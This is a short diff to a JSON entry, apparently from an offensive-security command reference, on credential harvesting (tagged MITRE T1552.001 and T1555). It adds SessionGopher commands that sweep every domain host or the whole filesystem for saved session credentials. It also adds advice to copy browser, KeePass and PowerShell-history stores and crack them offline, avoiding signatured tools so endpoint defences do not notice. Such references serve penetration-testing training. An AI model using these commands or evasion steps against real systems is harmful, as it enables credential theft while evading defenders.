@@ -82,6 +82,17 @@
       "HTB M26",
       "MITRE T1552.001",
       "MITRE T1555"
-    ]
-  }
+    ],
+    "evasion": "Copy the credential store (browser Login Data, .kdbx, PSReadline history) and decrypt/crack it OFFLINE rather than running signatured binaries (LaZagne/SharpChrome) on the host; scope searches to likely paths to limit disk I/O; use built-in cmdlets over dropped tools."
+  },
+  "variations": [
+    {
+      "label": "All hosts in the domain",
+      "command": "Invoke-SessionGopher -AllDomain -o"
+    },
+    {
+      "label": "Thorough (search filesystem too)",
+      "command": "Invoke-SessionGopher -Thorough"
+    }
+  ]
 }
